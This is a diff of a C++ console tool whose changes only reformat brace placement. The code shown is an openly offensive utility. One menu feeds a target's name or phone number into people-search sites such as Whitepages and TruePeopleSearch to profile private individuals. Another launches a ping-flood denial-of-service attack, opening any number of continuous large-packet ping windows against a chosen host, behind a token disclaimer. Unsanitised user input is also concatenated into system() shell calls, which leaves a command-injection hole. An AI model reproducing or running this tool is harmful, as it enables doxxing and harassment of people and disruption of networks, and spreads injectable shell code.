@@ -4,8 +4,7 @@
 void experimental(std::string, std::string);
 void moreStuff();
 
-int main()
-{
+int main() {
     std::cout << ("\033[1;35m\n"
         "__________.             _____       _____  _____.__\n"
         "|    |/ _|_____________/ ____\\_ ___/ ____\\/ ____\\  |   ____\n"
@@ -14,8 +13,7 @@ int main()
         "|____|__\\___  >__|   |__| |____/ |__|   |__|    |____/\\___ >\n"
         "       \\/   \\/                                            \\/\n"
         "©2024 Inf Potentiality\n\n");
-    while (true)
-    {
+    while (true) {
         std::cout << ("\033[1;m\n"
             "==============================\n"
             "\n"
@@ -36,8 +34,7 @@ int main()
         std::string num;
         std::cout << "\033[1;mInput service: ";
         std::cin >> menu;
-        if (menu > 0 && menu < 99)
-        {
+        if (menu > 0 && menu < 99) {
             std::cout << "PLEASE NOTE: Many of these services rely on either names or numbers, "
                 "so the chosen service may not work if one or both of the inputs are left blank." << std::endl;
             std::cout << "What is their name? (ENTER for none): ";
@@ -47,8 +44,7 @@ int main()
             std::getline(std::cin >> std::ws, num);
             std::cout << num << std::endl;
         }
-        switch (menu)
-        {
+        switch (menu) {
         case 1:
             system(("start https://www.facebook.com/search/top/?q=" + name + "+" + num).c_str());
             break;
@@ -57,21 +53,17 @@ int main()
             break;
         case 3:
             std::cout << "This service takes only either the name or number of a target; not both." << std::endl;
-            while (true)
-            {
+            while (true) {
                 std::cout << "Enter '1' if you would like to search the name, or '2' if you would like to search the number: ";
                 std::cin >> nameNum;
-                if (nameNum != 1 && nameNum != 2)
-                {
+                if (nameNum != 1 && nameNum != 2) {
                     std::cout << "ERROR: Choice not either '1' or '2'" << std::endl;
                 }
                 else {
-                    if (nameNum == 1)
-                    {
+                    if (nameNum == 1) {
                         system(("start https://www.whitepages.com/name/" + name).c_str());
                     }
-                    else if (nameNum == 2)
-                    {
+                    else if (nameNum == 2) {
                         system(("start https://www.whitepages.com/phone/" + num).c_str());
                     }
                 }
@@ -84,22 +76,17 @@ int main()
             system(("start https://www.usphonebook.com/" + num).c_str());
             break;
         case 6:
-            while (true)
-            {
+            while (true) {
                 std::cout << "Enter '1' if you would like to search the name, or '2' if you would like to search the number: ";
                 std::cin >> nameNum;
-                if (nameNum != 1 && nameNum != 2)
-                {
+                if (nameNum != 1 && nameNum != 2) {
                     std::cout << "ERROR: Choice not either '1' or '2'" << std::endl;
                 }
-                else
-                {
-                    if (nameNum == 1)
-                    {
+                else {
+                    if (nameNum == 1) {
                         system(("start https://www.searchpeoplefree.com/find/" + name).c_str());
                     }
-                    else if (nameNum == 2)
-                    {
+                    else if (nameNum == 2) {
                         system(("start https://www.searchpeoplefree.com/phone-lookup/find/" + num).c_str());
                     }
                 }
@@ -107,21 +94,17 @@ int main()
             break;
         case 7:
             std::cout << "This service takes only either the name or number of a target; not both." << std::endl;
-            while (true)
-            {
+            while (true) {
                 std::cout << "Enter '1' if you would like to search the name, or '2' if you would like to search the number: ";
                 std::cin >> nameNum;
-                if (nameNum != 1 && nameNum != 2)
-                {
+                if (nameNum != 1 && nameNum != 2) {
                     std::cout << "ERROR: Choice not either '1' or '2'" << std::endl;
                 }
                 else {
-                    if (nameNum == 1)
-                    {
+                    if (nameNum == 1) {
                         system(("start https://www.truepeoplesearch.com/results?name=" + name).c_str());
                     }
-                    else if (nameNum == 2)
-                    {
+                    else if (nameNum == 2) {
                         system(("start https://www.truepeoplesearch.com/resultphone?phoneno=" + num).c_str());
                     }
                 }
@@ -153,8 +136,7 @@ int main()
     }
 }
 
-void moreStuff()
-{
+void moreStuff() {
     std::cout << ("\033[0;32m\n"
         "___  ___                     _          __  ___\n"
         "|  \\/  |                    | |        / _|/ __|\n"
@@ -163,8 +145,7 @@ void moreStuff()
         "| |  | | (_) | | |  __  \\__ \\ |_| |_| | | | |\n"
         "|_|  |_|\\___/|_|  \\___| |___/\\__|\\____|_| |_|\n"
         "Still ©2024 Inf Potentiality\n");
-    while (true)
-    {
+    while (true) {
         std::cout << ("\033[1;m\n"
             "==============================\n"
             "\033[1;34m\n"
@@ -175,46 +156,38 @@ void moreStuff()
         int menu;
         std::cout << "\033[1;mInput service: ";
         std::cin >> menu;
-        if (menu == 0)
-        {
+        if (menu == 0) {
             std::cout << "\033[1;34mReturning to menu...";
             break;
         }
         std::string target;
         int bytes;
         int instances;
-        switch (menu)
-        {
+        switch (menu) {
         case 1:
             std::cout << "This program attempts a Denial of Service attack on whatever target you want." << std::endl;
             std::cout << "\033[1;33mDISCLAIMER: I am not responsible for misuse of this program. Only use this program with express permission from the person this is used on." << std::endl;
 
             std::cout << "\033[1;mInput target: ";
             std::cin >> target;
-            while (true)
-            {
+            while (true) {
                 std::cout << "How many bytes of data per ping should be sent? (max 65500): ";
                 std::cin >> bytes;
-                if (bytes > 65500 || bytes <= 0)
-                {
+                if (bytes > 65500 || bytes <= 0) {
                     std::cout << "ERROR: invalid byte size" << std::endl;
                 }
-                else
-                {
+                else {
                     std::cout << "How many instances of the ping command should be initialized?: ";
                     std::cin >> instances;
-                    if (instances > 0)
-                    {
+                    if (instances > 0) {
                         break;
                     }
-                    else
-                    {
+                    else {
                         std::cout << "ERROR: invalid instance number" << std::endl;
                     }
                 }
             }
-            for (int i = 0; i < instances; i++)
-            {
+            for (int i = 0; i < instances; i++) {
                 system(("start cmd /k ping " + target + " -l " + std::to_string(bytes) + " -t").c_str());
             }
             break;
